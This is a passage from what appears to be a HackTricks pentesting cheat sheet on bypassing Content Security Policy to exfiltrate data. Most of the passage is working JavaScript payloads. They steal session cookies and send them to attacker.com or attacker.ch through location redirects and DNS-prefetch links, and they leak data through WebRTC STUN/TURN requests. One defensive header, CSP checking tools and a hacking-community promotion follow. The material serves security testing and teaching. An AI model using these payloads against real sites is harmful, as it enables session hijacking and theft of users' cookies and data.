You could just update the location to send to the attacker's server the secret information:

```javascript
var sessionid = document.cookie.split('=')[1]+"."; 
document.location = "https://attacker.com/?" + sessionid;
```

### Meta tag

You could redirect by injecting a meta tag (this is just a redirect, this won't leak content)

```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```

### DNS Prefetch

To load pages faster, browsers are going to pre-resolve hostnames into IP addresses and cache them for later usage.\
You can indicate a browser to pre-resolve a hostname with: `<link reol="dns-prefetch" href="something.com">`

You could abuse this behaviour to **exfiltrate sensitive information via DNS requests**:

```javascript
var sessionid = document.cookie.split('=')[1]+"."; 
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```

Another way:

```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

In order to avoid this from happening the server can send the HTTP header:

```
X-DNS-Prefetch-Control: off
```

{% hint style="info" %}
Apparently, this technique doesn't work in headless browsers (bots)
{% endhint %}

### WebRTC

On several pages you can read that **WebRTC doesn't check the `connect-src` policy** of the CSP.

Actually you can _leak_ informations using a _DNS request_. Check out this code:

```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```

Another option:

```javascript
var pc = new RTCPeerConnection({
  "iceServers":[
      {"urls":[
        "turn:74.125.140.127:19305?transport=udp"
       ],"username":"_all_your_data_belongs_to_us",
      "credential":"."
    }]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```

## Checking CSP Policies Online

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Automatically creating CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## References

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
